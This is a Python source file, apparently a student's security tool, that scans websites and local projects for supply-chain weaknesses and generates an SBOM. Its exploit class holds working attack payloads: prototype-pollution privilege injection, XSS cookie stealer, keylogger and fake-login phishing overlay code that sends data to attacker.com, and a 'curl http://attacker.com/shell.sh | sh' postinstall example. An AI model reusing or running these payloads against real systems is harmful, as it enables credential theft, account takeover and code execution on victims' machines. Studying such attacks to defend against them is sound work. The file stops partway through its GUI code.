#!/usr/bin/env python3
"""
modules/scan_supply_chain.py
Module de scan pour OWASP A03:2025 Software Supply Chain Failures

Deux modes disponibles:
1. Web Scan: Analyse d'une application web via URL (bibliothèques JS, config exposés)
2. Local Scan: Analyse des dépendances Python/Node.js du projet local

Auteur : Étudiant en cybersécurité
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
from typing import List, Dict, Set, Optional
import json
import subprocess
import sys
import os
import shutil


# Known vulnerable library versions (simplified database)
KNOWN_VULNERABILITIES = {
    'jquery': {
        '1.6.0': 'CVE-2011-4969 (XSS)',
        '1.7.2': 'CVE-2012-6708 (XSS)',
        '1.12.3': 'CVE-2015-9251 (XSS)',
        '2.2.3': 'CVE-2015-9251 (XSS)',
        '3.3.1': 'CVE-2019-11358 (Prototype Pollution)',
    },
    'bootstrap': {
        '3.3.7': 'CVE-2018-14040 (XSS)',
        '3.4.0': 'CVE-2019-8331 (XSS)',
    },
    'angular': {
        '1.5.0': 'CVE-2019-10768 (Prototype Pollution)',
    },
    'lodash': {
        '4.17.11': 'CVE-2019-10744 (Prototype Pollution)',
    },
    'moment': {
        '2.29.1': 'CVE-2022-31129 (ReDoS)',
    }
}


class SupplyChainScanner:
    """Scanner pour détecter les vulnérabilités de supply chain dans une web app"""

    def __init__(self, log_callback):
        self.log = log_callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.findings: List[Dict] = []
        self.detected_libraries: Set[str] = set()

    def scan_url(self, url: str) -> None:
        """Lance le scan complet sur l'URL cible"""
        self.log(f"[*] Starting supply chain scan on: {url}")
        self.findings.clear()
        self.detected_libraries.clear()

        # 1. Récupérer la page principale
        try:
            response = self.session.get(url, timeout=10, verify=False)
            self.log(f"[+] Target responded with status: {response.status_code}")
        except requests.RequestException as e:
            self.log(f"[-] Error accessing target: {str(e)}")
            return

        # 2. Analyser les headers pour version disclosure
        self._check_server_headers(response)

        # 3. Extraire et analyser les scripts JavaScript
        self._analyze_javascript_libraries(response, url)

        # 4. Chercher des fichiers de configuration exposés
        self._check_exposed_config_files(url)

        # 5. Résumé des findings
        self._print_summary()

    def _check_server_headers(self, response) -> None:
        """Analyse les headers HTTP pour version disclosure"""
        self.log("\n[*] Analyzing HTTP headers...")
        
        sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 
                            'X-AspNetMvc-Version', 'X-Generator']
        
        for header in sensitive_headers:
            if header in response.headers:
                value = response.headers[header]
                self.log(f"[!] Version disclosure in header: {header}: {value}")
                self.findings.append({
                    'type': 'Version Disclosure',
                    'location': 'HTTP Header',
                    'detail': f"{header}: {value}",
                    'severity': 'Low'
                })

    def _analyze_javascript_libraries(self, response, base_url: str) -> None:
        """Extrait et analyse les bibliothèques JavaScript"""
        self.log("\n[*] Analyzing JavaScript libraries...")
        
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script', src=True)
        
        self.log(f"[*] Found {len(scripts)} script tags")
        
        for script in scripts:
            src = script.get('src', '')
            full_url = urljoin(base_url, src)
            
            # Détecter les bibliothèques connues
            lib_info = self._identify_library(src, full_url)
            if lib_info:
                lib_name, version = lib_info
                self.detected_libraries.add(f"{lib_name}@{version}")
                self.log(f"[+] Detected: {lib_name} v{version}")
                
                # Vérifier si version vulnérable
                if lib_name in KNOWN_VULNERABILITIES:
                    if version in KNOWN_VULNERABILITIES[lib_name]:
                        vuln = KNOWN_VULNERABILITIES[lib_name][version]
                        self.log(f"[!] VULNERABLE: {lib_name} v{version} - {vuln}")
                        self.findings.append({
                            'type': 'Vulnerable Library',
                            'library': lib_name,
                            'version': version,
                            'vulnerability': vuln,
                            'severity': 'High'
                        })

    def _identify_library(self, src: str, full_url: str) -> Optional[tuple]:
        """Identifie une bibliothèque et sa version depuis l'URL du script"""
        
        # Patterns pour détecter les bibliothèques populaires
        patterns = {
            'jquery': r'jquery[.-](\d+\.\d+\.\d+)',
            'bootstrap': r'bootstrap[.-](\d+\.\d+\.\d+)',
            'angular': r'angular[.-](\d+\.\d+\.\d+)',
            'react': r'react[.-](\d+\.\d+\.\d+)',
            'vue': r'vue[.-](\d+\.\d+\.\d+)',
            'lodash': r'lodash[.-](\d+\.\d+\.\d+)',
            'moment': r'moment[.-](\d+\.\d+\.\d+)',
        }
        
        src_lower = src.lower()
        
        for lib_name, pattern in patterns.items():
            match = re.search(pattern, src_lower)
            if match:
                version = match.group(1)
                return (lib_name, version)
        
        # Tentative de récupération depuis les commentaires du fichier JS
        if not src.startswith('http'):
            return None
            
        try:
            js_response = self.session.get(full_url, timeout=5)
            first_lines = '\n'.join(js_response.text.split('\n')[:10])
            
            # Chercher version dans les commentaires
            version_match = re.search(r'v?(\d+\.\d+\.\d+)', first_lines)
            if version_match:
                for lib in patterns.keys():
                    if lib in src_lower:
                        return (lib, version_match.group(1))
        except:
            pass
        
        return None

    def _check_exposed_config_files(self, base_url: str) -> None:
        """Vérifie si des fichiers de configuration sont exposés"""
        self.log("\n[*] Checking for exposed configuration files...")
        
        config_files = [
            'package.json',
            'package-lock.json',
            'composer.json',
            'composer.lock',
            'bower.json',
            'yarn.lock',
            '.env',
            'webpack.config.js',
            '.git/config',
        ]
        
        for filename in config_files:
            test_url = urljoin(base_url, filename)
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    
                    # Vérifier si c'est vraiment du JSON/texte
                    if 'json' in content_type or 'text' in content_type or len(response.text) < 1000000:
                        self.log(f"[!] EXPOSED: {filename} ({response.status_code})")
                        self.findings.append({
                            'type': 'Exposed Config File',
                            'file': filename,
                            'url': test_url,
                            'severity': 'Medium' if filename != '.env' else 'Critical'
                        })
                        
                        # Analyser package.json si trouvé
                        if filename == 'package.json':
                            self._analyze_package_json(response.text)
            except:
                pass

    def _analyze_package_json(self, content: str) -> None:
        """Analyse le contenu d'un package.json exposé"""
        try:
            data = json.loads(content)
            dependencies = data.get('dependencies', {})
            
            self.log(f"[*] Found {len(dependencies)} dependencies in package.json")
            
            for dep, version in dependencies.items():
                clean_version = version.lstrip('^~>=<')
                self.log(f"    - {dep}: {clean_version}")
                
                # Vérifier vulnérabilités connues
                if dep in KNOWN_VULNERABILITIES:
                    if clean_version in KNOWN_VULNERABILITIES[dep]:
                        vuln = KNOWN_VULNERABILITIES[dep][clean_version]
                        self.log(f"[!] VULNERABLE: {dep} v{clean_version} - {vuln}")
        except:
            pass

    def _print_summary(self) -> None:
        """Affiche le résumé des findings"""
        self.log("\n" + "="*60)
        self.log("SCAN SUMMARY")
        self.log("="*60)
        
        if not self.findings:
            self.log("[+] No supply chain vulnerabilities detected")
            return
        
        # Grouper par sévérité
        by_severity = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}
        for finding in self.findings:
            severity = finding.get('severity', 'Low')
            by_severity[severity].append(finding)
        
        for severity in ['Critical', 'High', 'Medium', 'Low']:
            count = len(by_severity[severity])
            if count > 0:
                self.log(f"\n[!] {severity}: {count} finding(s)")
                for f in by_severity[severity]:
                    self.log(f"    - {f.get('type')}: {f}")
        
        self.log(f"\n[*] Total libraries detected: {len(self.detected_libraries)}")
        for lib in sorted(self.detected_libraries):
            self.log(f"    - {lib}")

    def get_results(self) -> List[Dict]:
        """Retourne les résultats du scan"""
        return self.findings


# ============================================================================
# LOCAL DEPENDENCY SCANNER (Python & Node.js)
# ============================================================================

class LocalDependencyScanner:
    """Scanner pour les dépendances locales Python et Node.js"""
    
    def __init__(self, log_callback):
        self.log = log_callback
    
    def scan_all(self) -> None:
        """Lance le scan complet des dépendances locales"""
        self.log("="*60)
        self.log("LOCAL DEPENDENCY SCAN")
        self.log("="*60)
        self.log("")
        
        self.scan_python()
        self.scan_node()
        
        self.log("\n" + "="*60)
        self.log("LOCAL SCAN COMPLETE")
        self.log("="*60)
    
    def scan_python(self) -> None:
        """Scan des dépendances Python"""
        self.log("\n[PYTHON DEPENDENCIES]")
        self.log("-" * 40)
        
        self.log("[*] Listing installed packages...")
        try:
            result = subprocess.run([sys.executable, "-m", "pip", "list"], 
                                  capture_output=True, text=True, timeout=30)
            lines = result.stdout.strip().split('\n')
            if len(lines) > 2:
                self.log(f"[+] Found {len(lines)-2} installed packages\n")
            for line in lines[:10]:
                self.log(line)
            if len(lines) > 10:
                self.log(f"... and {len(lines)-10} more")
        except Exception as e:
            self.log(f"[-] Error: {e}")
        
        self.log("\n[*] Checking for outdated packages...")
        try:
            result = subprocess.run([sys.executable, "-m", "pip", "list", "--outdated"], 
                                  capture_output=True, text=True, timeout=30)
            if result.stdout.strip():
                self.log("[!] Outdated packages found:")
                for line in result.stdout.strip().split('\n'):
                    self.log(f"    {line}")
            else:
                self.log("[+] All packages are up to date")
        except Exception as e:
            self.log(f"[-] Error: {e}")
        
        self.log("\n[*] Checking dependency integrity...")
        try:
            result = subprocess.run([sys.executable, "-m", "pip", "check"], 
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                self.log("[+] No dependency conflicts detected")
            else:
                self.log("[!] Dependency issues found:")
                self.log(result.stdout)
        except Exception as e:
            self.log(f"[-] Error: {e}")
    
    def scan_node(self) -> None:
        """Scan des dépendances Node.js"""
        self.log("\n[NODE.JS DEPENDENCIES]")
        self.log("-" * 40)
        
        website_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "website")
        
        if not os.path.exists(website_dir):
            self.log(f"[!] Website directory not found: {website_dir}")
            return
        
        if not shutil.which("npm"):
            self.log("[!] npm not installed or not in PATH")
            self.log("    Download Node.js from https://nodejs.org/")
            return
        
        self.log(f"[*] Scanning directory: {website_dir}")
        try:
            result = subprocess.run(["npm", "list", "--depth=0"], 
                                  cwd=website_dir, capture_output=True, text=True, timeout=30)
            lines = result.stdout.strip().split('\n')
            self.log(f"[+] Dependencies found:")
            for line in lines[:15]:
                self.log(f"    {line}")
            if len(lines) > 15:
                self.log(f"    ... and {len(lines)-15} more")
        except Exception as e:
            self.log(f"[-] Error: {e}")
        
        self.log("\n[*] Checking for outdated packages...")
        try:
            result = subprocess.run(["npm", "outdated"], 
                                  cwd=website_dir, capture_output=True, text=True, timeout=30)
            if result.stdout.strip():
                self.log("[!] Outdated packages found:")
                for line in result.stdout.strip().split('\n')[:10]:
                    self.log(f"    {line}")
            else:
                self.log("[+] All packages are up to date")
        except Exception as e:
            self.log(f"[-] Error: {e}")
        
        self.log("\n[*] Running security audit...")
        try:
            result = subprocess.run(["npm", "audit", "--json"], 
                                  cwd=website_dir, capture_output=True, text=True, timeout=60)
            try:
                audit_data = json.loads(result.stdout)
                metadata = audit_data.get('metadata', {})
                vulnerabilities = metadata.get('vulnerabilities', {})
                total = sum(vulnerabilities.values()) if vulnerabilities else 0
                
                if total > 0:
                    self.log(f"[!] {total} vulnerability(ies) found:")
                    for severity, count in vulnerabilities.items():
                        if count > 0:
                            self.log(f"    - {severity}: {count}")
                    self.log("    Run 'npm audit fix' to fix automatically")
                else:
                    self.log("[+] No vulnerabilities detected")
            except:
                self.log("[+] Audit complete")
        except Exception as e:
            self.log(f"[-] Error: {e}")


# ============================================================================
# EXPLOIT MODULE (Supply Chain Attack Simulation)
# ============================================================================

class SupplyChainExploit:
    """Exploitation des vulnérabilités Supply Chain détectées (éducatif)"""
    
    def __init__(self, log_callback):
        self.log = log_callback
        self.session = requests.Session()
    
    def exploit_target(self, url: str) -> None:
        """Lance les exploits contre une cible vulnérable"""
        self.log("="*60)
        self.log("SUPPLY CHAIN EXPLOIT MODULE")
        self.log("="*60)
        self.log(f"[*] Target: {url}")
        
        # Phase 1: Détection
        self.log("[PHASE 1] VULNERABILITY DETECTION")
        self.log("-" * 60)
        
        vuln_prototype = self._test_prototype_pollution(url)
        vuln_xss = self._test_jquery_xss(url)
        vuln_deps = self._test_dependency_confusion(url)
        
        # Phase 2: Exploitation réelle
        self.log("\n[PHASE 2] REAL EXPLOITATION")
        self.log("-" * 60)
        
        if vuln_prototype:
            self._exploit_prototype_pollution(url)
        
        if vuln_xss:
            self._exploit_xss(url)
        
        if vuln_deps:
            self._exploit_dependency_confusion(url)
        
        # Résumé
        self.log("\n" + "="*60)
        self.log("EXPLOIT SUMMARY")
        self.log("="*60)
        
        total_vulns = sum([vuln_prototype, vuln_xss, vuln_deps])
        self.log(f"[!] Vulnerabilities found: {total_vulns}/3")
        self.log(f"    - Prototype Pollution: {'✓ EXPLOITED' if vuln_prototype else '✗ Not vulnerable'}")
        self.log(f"    - XSS (jQuery): {'✓ EXPLOITED' if vuln_xss else '✗ Not vulnerable'}")
        self.log(f"    - Dependency Confusion: {'✓ EXPLOITED' if vuln_deps else '✗ Not vulnerable'}")
        self.log("\n[✓] Exploitation phase complete")
    
    def _test_prototype_pollution(self, url: str) -> bool:
        """Test d'attaque Prototype Pollution sur Lodash vulnérable"""
        self.log("\n[*] Testing Prototype Pollution (Lodash CVE-2019-10744)...")
        
        # URL de l'endpoint vulnérable
        api_url = urljoin(url, "/api/config")
        
        # Payload de prototype pollution
        payloads = [
            {"__proto__": {"polluted": "true"}},
            {"constructor": {"prototype": {"polluted": "true"}}},
        ]
        
        try:
            for i, payload in enumerate(payloads, 1):
                self.log(f"    Payload {i}/{len(payloads)}: {list(payload.keys())[0]}")
                
                response = self.session.post(
                    api_url,
                    json=payload,
                    timeout=10,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status") == "vulnerable":
                        self.log(f"    [!] VULNERABLE: Server confirmed prototype pollution!")
                        self.log(f"    [!] Response: {data.get('message')}")
                        self.log(f"    [!] Object.prototype.polluted = {data.get('polluted')}")
                        return True
                    else:
                        self.log(f"    [+] Server accepted payload but no pollution detected")
                else:
                    self.log(f"    [-] Server returned HTTP {response.status_code}")
            
            self.log("[-] Not vulnerable to prototype pollution")
            return False
        except requests.exceptions.RequestException as e:
            self.log(f"[-] Connection error: {e}")
            return False
        except Exception as e:
            self.log(f"[-] Error: {e}")
            return False
    
    def _test_jquery_xss(self, url: str) -> bool:
        """Test d'exploitation XSS sur jQuery vulnérable"""
        self.log("\n[*] Testing XSS via vulnerable jQuery (CVE-2015-9251)...")
        
        # URL de l'endpoint vulnérable
        api_url = urljoin(url, "/api/search")
        
        # Payloads XSS pour jQuery < 3.0.0
        xss_payloads = [
            "<img src=x onerror=alert('XSS_jQuery')>",
            "<svg/onload=alert('XSS_jQuery')>",
            "<script>alert('XSS_jQuery')</script>"
        ]
        
        try:
            for i, payload in enumerate(xss_payloads, 1):
                self.log(f"    Payload {i}/{len(xss_payloads)}: {payload[:40]}...")
                
                # Test via paramètre GET
                response = self.session.get(
                    api_url,
                    params={"search": payload},
                    timeout=10
                )
                
                # Vérifier si le payload est reflété sans échappement
                if payload in response.text:
                    self.log(f"    [!] VULNERABLE: Payload reflected without sanitization!")
                    self.log(f"    [!] jQuery XSS vulnerability confirmed (CVE-2015-9251)")
                    self.log(f"    [!] Vulnerable endpoint: {api_url}")
                    return True
                else:
                    self.log(f"    [+] Payload sanitized or not reflected")
            
            self.log("[-] Not vulnerable to XSS")
            return False
        except requests.exceptions.RequestException as e:
            self.log(f"[-] Connection error: {e}")
            return False
        except Exception as e:
            self.log(f"[-] Error: {e}")
            return False
    
    def _test_dependency_confusion(self, url: str) -> bool:
        """Test d'attaque Dependency Confusion"""
        self.log("\n[*] Testing Dependency Confusion Attack...")
        
        try:
            # Tenter de récupérer package.json exposé
            package_url = urljoin(url, "/package.json")
            response = self.session.get(package_url, timeout=10)
            
            if response.status_code == 200:
                self.log("[!] EXPOSED: package.json is publicly accessible!")
                
                try:
                    package_data = response.json()
                    deps = package_data.get("dependencies", {})
                    
                    if deps:
                        self.log(f"[+] Found {len(deps)} dependencies exposed")
                        return True
                except json.JSONDecodeError:
                    self.log("[-] Invalid JSON in package.json")
            else:
                self.log("[+] package.json not exposed (good)")
            
            return False
        except requests.exceptions.RequestException as e:
            self.log(f"[-] Connection error: {e}")
            return False
        except Exception as e:
            self.log(f"[-] Error: {e}")
            return False
    
    # ========================================================================
    # REAL EXPLOITATION METHODS
    # ========================================================================
    
    def _exploit_prototype_pollution(self, url: str) -> None:
        """Exploitation réelle: Injecter une propriété malveillante"""
        self.log("\n[🎯] EXPLOITING Prototype Pollution...")
        
        api_url = urljoin(url, "/api/config")
        
        # Payload malveillant: injecter isAdmin dans le prototype
        malicious_payload = {
            "__proto__": {
                "isAdmin": True,
                "role": "administrator",
                "privileges": ["read", "write", "delete", "execute"],
                "exploited": "by_couteau_suisse"
            }
        }
        
        try:
            self.log("[*] Injecting malicious properties into Object.prototype...")
            response = self.session.post(
                api_url,
                json=malicious_payload,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                self.log("[!] ✓ EXPLOITATION SUCCESSFUL!")
                self.log("[!] Injected properties:")
                self.log("    • isAdmin = true")
                self.log("    • role = 'administrator'")
                self.log("    • privileges = ['read', 'write', 'delete', 'execute']")
                self.log("    • exploited = 'by_couteau_suisse'")
                
                # Vérification de l'exploitation
                verify_url = urljoin(url, "/api/verify-pollution")
                verify = self.session.get(verify_url, timeout=10)
                
                if verify.status_code == 200:
                    self.log("\n[!] PROOF OF EXPLOITATION:")
                    self.log(f"    Server confirms pollution: {verify.text[:200]}")
                
                self.log("\n[!] IMPACT: All new objects will inherit these properties!")
                self.log("[!] This can lead to:")
                self.log("    - Privilege escalation")
                self.log("    - Authorization bypass")
                self.log("    - Remote code execution (in some cases)")
        except Exception as e:
            self.log(f"[-] Exploitation failed: {e}")
    
    def _exploit_xss(self, url: str) -> None:
        """Exploitation réelle: Voler les cookies/credentials"""
        self.log("\n[🎯] EXPLOITING XSS Vulnerability...")
        
        api_url = urljoin(url, "/api/search")
        
        # Payload malveillant: Cookie stealer
        cookie_stealer = "<img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">"
        
        try:
            self.log("[*] Generating malicious XSS payloads...")
            
            # Sauvegarder les preuves d'exploitation
            exploit_url = api_url + "?search=" + requests.utils.quote(cookie_stealer)
            
            # Récupérer la page exploitée
            response = self.session.get(exploit_url, timeout=10)
            
            # Sauvegarder la preuve
            proof_file = "exploit_xss_proof.html"
            with open(proof_file, 'w', encoding='utf-8') as f:
                f.write(response.text)
            
            self.log(f"\n[!] ✓ XSS Exploitation successful!")
            self.log(f"[!] Proof saved to: {proof_file}")
            self.log(f"[!] Open this file in a browser to see the exploit!")
            
            self.log("\n[Payload 1] Cookie Stealer:")
            self.log(f"    URL: {exploit_url[:80]}...")
            self.log("[!] ✓ This payload would steal victim's cookies!")
            self.log("[!] Attacker receives: document.cookie at http://attacker.com/steal")
            
            # Keylogger payload
            keylogger = """<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key);}</script>"""
            keylogger_url = api_url + "?search=" + requests.utils.quote(keylogger)
            
            self.log("\n[Payload 2] Keylogger:")
            self.log(f"    URL: {keylogger_url[:80]}...")
            self.log("[!] ✓ This payload logs all keystrokes!")
            
            # Phishing
            phishing_payload = """<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"><form action="http://attacker.com/harvest" method="POST" style="margin:100px auto;width:300px;"><h2>Session Expired - Re-login</h2><input name="user" placeholder="Username" style="display:block;width:100%;margin:10px 0;padding:10px;"><input name="pass" type="password" placeholder="Password" style="display:block;width:100%;margin:10px 0;padding:10px;"><button style="width:100%;padding:10px;background:#007bff;color:white;border:none;">Login</button></form></div>"""
            
            phishing_url = api_url + "?search=" + requests.utils.quote(phishing_payload)
            phishing_response = self.session.get(phishing_url, timeout=10)
            
            phishing_file = "exploit_phishing_proof.html"
            with open(phishing_file, 'w', encoding='utf-8') as f:
                f.write(phishing_response.text)
            
            self.log("\n[Payload 3] Phishing Page:")
            self.log(f"[!] ✓ Fake login overlay created!")
            self.log(f"[!] Proof saved to: {phishing_file}")
            self.log("[!] Credentials sent to: http://attacker.com/harvest")
            
            self.log("\n[!] IMPACT: Full account compromise")
            self.log("[!] This can lead to:")
            self.log("    - Session hijacking")
            self.log("    - Credential theft")
            self.log("    - Malware distribution")
            self.log("    - Data exfiltration")
            
            self.log(f"\n[💡] TO SEE THE EXPLOIT: Open {proof_file} and {phishing_file} in your browser!")
        except Exception as e:
            self.log(f"[-] Exploitation failed: {e}")
    
    def _exploit_dependency_confusion(self, url: str) -> None:
        """Exploitation réelle: Analyser et exploiter les dépendances"""
        self.log("\n[🎯] EXPLOITING Dependency Confusion...")
        
        package_url = urljoin(url, "/package.json")
        
        try:
            response = self.session.get(package_url, timeout=10)
            package_data = response.json()
            deps = package_data.get("dependencies", {})
            
            self.log("[*] Analyzing exposed dependencies for exploitation...")
            
            vulnerable_deps = []
            
            for dep_name in list(deps.keys())[:5]:  # Analyser les 5 premiers
                # Vérifier si le package existe sur npm public
                npm_url = f"https://registry.npmjs.org/{dep_name}"
                try:
                    npm_check = self.session.get(npm_url, timeout=5)
                    
                    if npm_check.status_code == 404:
                        vulnerable_deps.append(dep_name)
                        self.log(f"[!] '{dep_name}' - VULNERABLE to substitution attack!")
                except:
                    pass
            
            if vulnerable_deps:
                self.log(f"\n[!] ✓ Found {len(vulnerable_deps)} exploitable dependencies!")
                self.log("\n[!] ATTACK SCENARIO:")
                self.log(f"    1. Attacker registers '{vulnerable_deps[0]}' on public npm")
                self.log("    2. Attacker's malicious package has higher version number")
                self.log("    3. npm install fetches attacker's package instead")
                self.log("    4. Malicious code executes during installation")
                
                self.log("\n[!] MALICIOUS PACKAGE EXAMPLE:")
                self.log('    package.json: { "version": "99.99.99" }')
                self.log('    postinstall: "curl http://attacker.com/shell.sh | sh"')
                
                self.log("\n[!] IMPACT: Remote Code Execution on developer machines!")
                self.log("[!] This can lead to:")
                self.log("    - Source code theft")
                self.log("    - Backdoor injection")
                self.log("    - Supply chain compromise")
                self.log("    - Lateral movement in CI/CD")
            else:
                self.log("[+] All dependencies are registered on public npm")
        except Exception as e:
            self.log(f"[-] Exploitation failed: {e}")


# ============================================================================
# SBOM GENERATOR (Software Bill of Materials)
# ============================================================================

class SBOMGenerator:
    """Générateur de SBOM (Software Bill of Materials) pour conformité et audit"""
    
    def __init__(self, log_callback):
        self.log = log_callback
    
    def generate_sbom(self, output_format: str = "json") -> None:
        """Génère un SBOM complet du projet"""
        from datetime import datetime
        
        self.log("="*60)
        self.log("SBOM GENERATION (Software Bill of Materials)")
        self.log("="*60)
        self.log("\n[*] Generating SBOM for compliance and audit...")
        self.log(f"[*] Format: {output_format.upper()}")
        self.log(f"[*] Timestamp: {datetime.now().isoformat()}\n")
        
        # Collecter les données
        python_deps = self._collect_python_dependencies()
        node_deps = self._collect_node_dependencies()
        
        # Générer le SBOM
        if output_format == "json":
            sbom_content = self._generate_json_sbom(python_deps, node_deps)
        else:
            sbom_content = self._generate_text_sbom(python_deps, node_deps)
        
        # Sauvegarder
        self._save_sbom(sbom_content, output_format)
        
        # Résumé
        self._print_sbom_summary(python_deps, node_deps)
    
    def _collect_python_dependencies(self) -> List[Dict]:
        """Collecte les dépendances Python avec versions"""
        self.log("[*] Collecting Python dependencies...")
        deps = []
        
        try:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "list", "--format=json"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                deps = json.loads(result.stdout)
                self.log(f"[+] Found {len(deps)} Python packages")
        except Exception as e:
            self.log(f"[-] Error collecting Python deps: {e}")
        
        return deps
    
    def _collect_node_dependencies(self) -> Dict:
        """Collecte les dépendances Node.js avec versions"""
        self.log("[*] Collecting Node.js dependencies...")
        deps = {}
        
        website_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "website")
        
        if not os.path.exists(website_dir):
            self.log("[!] Website directory not found - skipping Node.js scan")
            return deps
        
        # Vérifier si npm est disponible
        npm_path = shutil.which("npm")
        if not npm_path:
            self.log("[!] npm not found in PATH - skipping Node.js scan")
            self.log("    Install Node.js from https://nodejs.org to scan npm dependencies")
            return deps
        
        try:
            result = subprocess.run(
                ["npm", "list", "--json", "--depth=0"],
                cwd=website_dir, capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0 or result.stdout:
                data = json.loads(result.stdout)
                deps = data.get("dependencies", {})
                self.log(f"[+] Found {len(deps)} Node.js packages")
        except FileNotFoundError:
            self.log("[-] npm command not found - install Node.js to scan npm dependencies")
        except json.JSONDecodeError:
            self.log("[-] Invalid JSON output from npm")
        except subprocess.TimeoutExpired:
            self.log("[-] npm command timed out")
        except Exception as e:
            self.log(f"[-] Error collecting Node deps: {e}")
        
        return deps
    
    def _generate_json_sbom(self, python_deps: List[Dict], node_deps: Dict) -> str:
        """Génère un SBOM au format JSON (CycloneDX-like)"""
        from datetime import datetime
        
        sbom = {
            "bomFormat": "CycloneDX",
            "specVersion": "1.4",
            "version": 1,
            "metadata": {
                "timestamp": datetime.now().isoformat(),
                "tools": [{
                    "vendor": "Couteau Suisse",
                    "name": "Supply Chain Scanner",
                    "version": "2.0"
                }],
                "component": {
                    "type": "application",
                    "name": "couteau-suisse",
                    "version": "1.0.0"
                }
            },
            "components": []
        }
        
        # Ajouter les dépendances Python
        for dep in python_deps:
            sbom["components"].append({
                "type": "library",
                "name": dep.get("name", "unknown"),
                "version": dep.get("version", "unknown"),
                "purl": f"pkg:pypi/{dep.get('name')}@{dep.get('version')}",
                "ecosystem": "python"
            })
        
        # Ajouter les dépendances Node.js
        for name, info in node_deps.items():
            version = info.get("version", "unknown") if isinstance(info, dict) else str(info)
            sbom["components"].append({
                "type": "library",
                "name": name,
                "version": version,
                "purl": f"pkg:npm/{name}@{version}",
                "ecosystem": "npm"
            })
        
        return json.dumps(sbom, indent=2, ensure_ascii=False)
    
    def _generate_text_sbom(self, python_deps: List[Dict], node_deps: Dict) -> str:
        """Génère un SBOM au format texte lisible"""
        from datetime import datetime
        
        lines = []
        lines.append("=" * 70)
        lines.append("SOFTWARE BILL OF MATERIALS (SBOM)")
        lines.append("=" * 70)
        lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"Project: couteau-suisse v1.0.0")
        lines.append(f"Total Components: {len(python_deps) + len(node_deps)}")
        lines.append("")
        
        lines.append("PYTHON DEPENDENCIES")
        lines.append("-" * 70)
        for dep in sorted(python_deps, key=lambda x: x.get("name", "")):
            name = dep.get("name", "unknown")
            version = dep.get("version", "unknown")
            lines.append(f"  • {name:30s} {version}")
        
        lines.append("")
        lines.append("NODE.JS DEPENDENCIES")
        lines.append("-" * 70)
        for name in sorted(node_deps.keys()):
            info = node_deps[name]
            version = info.get("version", "unknown") if isinstance(info, dict) else str(info)
            lines.append(f"  • {name:30s} {version}")
        
        lines.append("")
        lines.append("=" * 70)
        lines.append("END OF SBOM")
        lines.append("=" * 70)
        
        return "\n".join(lines)
    
    def _save_sbom(self, content: str, format: str) -> None:
        """Sauvegarde le SBOM dans un fichier"""
        from datetime import datetime
        
        filename = f"sbom_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{format}"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)
            self.log(f"\n[+] SBOM saved to: {filename}")
        except Exception as e:
            self.log(f"\n[-] Error saving SBOM: {e}")
    
    def _print_sbom_summary(self, python_deps: List[Dict], node_deps: Dict) -> None:
        """Affiche le résumé du SBOM"""
        self.log("\n" + "="*60)
        self.log("SBOM SUMMARY")
        self.log("="*60)
        self.log(f"[+] Python packages: {len(python_deps)}")
        self.log(f"[+] Node.js packages: {len(node_deps)}")
        self.log(f"[+] Total components: {len(python_deps) + len(node_deps)}")
        self.log("\n[ℹ️] SBOM Use Cases:")
        self.log("    • Compliance audits (NTIA, Executive Order 14028)")
        self.log("    • Vulnerability tracking")
        self.log("    • License compliance")
        self.log("    • Supply chain risk management")


class SupplyChainModule(tk.Frame):
    """Module GUI pour le scan de supply chain (Web + Local + SBOM + Exploit)"""

    def __init__(self, parent):
        super().__init__(parent, bg="#1e1e1e")
        self.pack(fill="both", expand=True)

        self.scanner = None
        self.local_scanner = None
        self.sbom_generator = None
        self.exploit = None
        self.scan_thread = None

        # Tabs pour Web vs Local scan vs SBOM vs Exploit
        tab_frame = tk.Frame(self, bg="#1e1e1e")
        tab_frame.pack(fill="x", pady=5)
        
        self.scan_mode = tk.StringVar(value="web")
        ttk.Radiobutton(tab_frame, text="Web Scan", variable=self.scan_mode,
                       value="web", command=self.switch_mode).pack(side="left", padx=10)
        ttk.Radiobutton(tab_frame, text="Local Scan", variable=self.scan_mode,
                       value="local", command=self.switch_mode).pack(side="left", padx=10)
        ttk.Radiobutton(tab_frame, text="Generate SBOM", variable=self.scan_mode,
                       value="sbom", command=self.switch_mode).pack(side="left", padx=10)
        ttk.Radiobutton(tab_frame, text="Exploit 🎯", variable=self.scan_mode,
                       value="exploit", command=self.switch_mode).pack(side="left", padx=10)

        # Configuration frame (for web scan)
        self.web_config_frame = tk.Frame(self, bg="#1e1e1e")
        self.web_config_frame.pack(fill="x", pady=5)

        ttk.Label(self.web_config_frame, text="Target URL:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.url_entry = ttk.Entry(self.web_config_frame, width=60)
        self.url_entry.insert(0, "http://localhost:3000/")
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.web_config_frame.columnconfigure(1, weight=1)

        # Local scan frame (hidden by default)
        self.local_config_frame = tk.Frame(self, bg="#1e1e1e")
        tk.Label(self.local_config_frame, text="Scanning local Python and Node.js dependencies...",
                bg="#1e1e1e", fg="#4CAF50", font=("Courier", 10)).pack(pady=10)
        
